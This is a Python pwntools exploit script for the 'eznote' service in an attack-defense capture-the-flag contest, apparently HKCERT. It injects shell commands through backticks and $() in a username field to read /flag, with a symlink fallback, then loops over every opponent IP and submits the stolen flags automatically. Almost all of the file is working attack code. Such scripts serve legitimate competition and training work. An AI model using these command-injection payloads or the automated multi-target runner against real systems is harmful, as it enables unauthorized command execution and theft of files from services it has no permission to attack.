#!/usr/bin/env python3
"""
eznote - Command Injection Exploit
==================================
Vulnerability: Username field allows command injection via backticks.
The create_note_dir function runs: mkdir -p "%s/%s/" with username.
USERNAME_BLACKLIST only blocks: " ' .
But backticks ` and $() are NOT blocked!

Strategy:
1. Set username to: x`cat /flag`
2. Call create note dir (option 2)
3. This executes: mkdir -p "/tmp/PID/x<FLAG_CONTENT>/"
4. Read the created directory name to get the flag

Usage:
    python3 eznote_exploit.py              # Run against all targets (AWD mode)
    python3 eznote_exploit.py 172.24.84.11 # Run against specific IP
    python3 eznote_exploit.py --loop       # Run continuously
    python3 eznote_exploit.py local        # Test locally
"""

import sys
import os
import time

# Suppress pwntools noise (must be before import)
os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *
from pwn_lib import (
    setup_binary, add_breakpoint, get_io, shortcuts,
    p64, p32, u64, u32, uu64, uu32, leak_addr,
)
from awd_lib import (
    chal, submit, targets, our_ip, discord,
    setup_auth, ssh_command, print_info, print_targets,
)

# === CHALLENGE CONFIG ===
BINARY = "./src/chall"  # Path to binary (for local testing)
LIBC = None             # Path to libc (e.g., "./libc.so.6")
PORT = 1000             # Remote port for eznote
TIMEOUT = 10            # Connection timeout
LOOP_DELAY = 60         # Seconds between rounds (for --loop)

# Configure challenge (uncomment and edit as needed)
# chal("path/to/creds.csv")

# Setup binary for local testing/debugging (uncomment when needed)
# bin, rop, libc = setup_binary(BINARY, LIBC, log_level='error')

# GDB breakpoints (for debug mode)
# add_breakpoint('main', 'vuln+32', '0x401234')

# Suppress pwntools output for AWD mode
context.log_level = 'error'
context.timeout = TIMEOUT

# ========================
# YOUR EXPLOIT CODE HERE
# ========================

def exploit(ip, port):
    """
    Exploit command injection in username to read /flag.
    
    Vulnerability: create_note_dir (option 2) runs system() without sandbox:
        mkdir -p "PATH_PREFIX/USERNAME/"
    
    USERNAME_BLACKLIST only blocks: " ' .
    Backticks and $() are NOT blocked, allowing command injection!
    
    Strategy: Try multiple methods to read /flag
    1. cat /flag - standard
    2. $(</flag) - bash file read
    3. head /flag - alternative
    """
    import re
    
    methods = [
        b'x`cat /flag >&2`',           # Method 1: cat to stderr
        b'x$(cat /flag >&2)',          # Method 2: $() subshell
        b'x`head -1 /flag >&2`',       # Method 3: head
        b'x`while read l;do echo $l>&2;done</flag`',  # Method 4: shell read loop
    ]
    
    for method in methods:
        try:
            io = remote(ip, port, timeout=TIMEOUT)
            s = shortcuts(io)
            
            # Set username with command injection
            s.ru(b'Username: ')
            io.sendline(method)
            s.sla(b'> ', b'2')  # create note dir - triggers injection
            
            # Receive all output
            data = io.recvrepeat(1)
            io.close()
            
            # Try flag{...} format
            match = re.search(rb'flag\{[^}]+\}', data, re.IGNORECASE)
            if match:
                return match.group(0).decode()
            
            # Try hkcert{...} format
            match = re.search(rb'(hkcert\d*\{[^}]+\})', data, re.IGNORECASE)
            if match:
                return match.group(1).decode()
                
        except Exception as e:
            continue
    
    # Try symlink method as fallback
    try:
        return exploit_symlink(ip, port)
    except:
        pass
        
    return None


def exploit_symlink(ip, port):
    """
    Fallback exploit using symlink attack.
    Creates symlink to /flag then reads via show_note.
    """
    import re
    
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        s = shortcuts(io)
        
        # Step 1: Create user directory
        s.ru(b'Username: ')
        io.sendline(b'test')
        s.sla(b'> ', b'2')
        
        # Step 2: Create symlink via command injection
        s.sla(b'> ', b'1')
        s.ru(b'Username: ')
        io.sendline(b'x`ln -sf /flag $(ls -d /tmp/$PPID/*/test)/aa`')
        s.sla(b'> ', b'2')
        
        # Step 3: Switch back to test user and read
        s.sla(b'> ', b'1')
        s.ru(b'Username: ')
        io.sendline(b'test')
        
        # Step 4: Read via show_note
        s.sla(b'> ', b'4')
        s.ru(b'note name: ')
        io.sendline(b'aa')
        
        data = io.recvrepeat(1)
        io.close()
        
        # Extract flag
        match = re.search(rb'Note content: ([^\n]+)', data)
        if match:
            content = match.group(1).decode().strip()
            if '{' in content:
                return content
        
        match = re.search(rb'(hkcert\d*\{[^}]+\})', data, re.IGNORECASE)
        if match:
            return match.group(1).decode()
        
        match = re.search(rb'flag\{[^}]+\}', data, re.IGNORECASE)
        if match:
            return match.group(0).decode()
            
        return None
        
    except Exception as e:
        return None


def exploit_dev(io):
    """
    Development version of exploit for local testing.
    """
    s = shortcuts(io)
    
    # Step 1: Copy /tmp/flag (test location) to /tmp/exfil
    s.ru(b'Username: ')
    io.sendline(b'a`cp /tmp/flag /tmp/exfil`')
    s.sla(b'> ', b'2')
    print("[*] Copied flag")
    
    # Step 2: Cat the flag to stderr (appears in output)
    s.sla(b'> ', b'1')
    s.ru(b'Username: ')
    io.sendline(b'a`cat /tmp/exfil>&2`')
    s.sla(b'> ', b'2')
    
    data = io.recvrepeat(1)
    print(f"[*] Output: {data}")
    
    # Also check the file directly
    import subprocess
    result = subprocess.run(['cat', '/tmp/exfil'], capture_output=True, text=True)
    print(f"[+] Flag from file: {result.stdout.strip()}")
    
    io.close()


# ========================
# RUNNER CODE (don't edit)
# ========================

def run_single(ip):
    """Run exploit against a single target."""
    print(f"[*] Attacking {ip}:{PORT}...")
    flag = exploit(ip, PORT)
    
    if flag:
        print(f"[+] Got flag: {flag}")
        result = submit(flag, target=ip)
        if result["success"]:
            if result["duplicate"]:
                print(f"[=] Flag submitted (duplicate)")
            else:
                print(f"[+] NEW FLAG SUBMITTED!")
        else:
            print(f"[-] Submit failed: {result['message']}")
        return True
    else:
        print(f"[-] No flag from {ip}")
        return False


def run_all():
    """Run exploit against all targets."""
    target_list = targets()  # Already excludes our IP
    
    print(f"[*] Our IP: {our_ip()}")
    print(f"[*] Targets: {len(target_list)}")
    print(f"[*] Port: {PORT}")
    print()
    
    success = 0
    failed = 0
    
    for ip in target_list:
        if run_single(ip):
            success += 1
        else:
            failed += 1
    
    print()
    print(f"[*] Done: {success} success, {failed} failed")
    return success, failed


def run_loop():
    """Run exploit continuously."""
    print(f"[*] Running in loop mode (Ctrl+C to stop)")
    print(f"[*] Delay between rounds: {LOOP_DELAY}s")
    
    round_num = 0
    while True:
        round_num += 1
        print(f"\n{'='*50}")
        print(f"ROUND {round_num}")
        print(f"{'='*50}")
        
        try:
            run_all()
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            break
        except Exception as e:
            print(f"[-] Round error: {e}")
        
        print(f"[*] Sleeping {LOOP_DELAY}s...")
        try:
            time.sleep(LOOP_DELAY)
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            break


def main():
    # Auto-setup auth PEM file
    try:
        setup_auth()
    except Exception as e:
        pass  # Silently skip if not in AWD environment
    
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        
        # Development modes
        if arg == "local":
            context.log_level = 'debug'
            setup_binary(BINARY, LIBC, log_level='debug')
            io = get_io("_local")
            exploit_dev(io)
            return
        elif arg == "debug":
            context.log_level = 'debug'
            setup_binary(BINARY, LIBC, log_level='debug')
            io = get_io("_debug")
            exploit_dev(io)
            return
        
        # AWD modes
        elif arg == "--loop" or arg == "-l":
            run_loop()
        elif arg == "--help" or arg == "-h":
            print(__doc__)
        elif arg == "--info" or arg == "-i":
            print_info()
        elif arg == "--targets" or arg == "-t":
            print_targets()
        elif arg == "--ssh":
            ip = sys.argv[2] if len(sys.argv) > 2 else targets()[0]
            print(ssh_command(ip))
        else:
            # Attack specific IP
            run_single(arg)
    else:
        # Attack all targets once
        run_all()


if __name__ == "__main__":
    main()
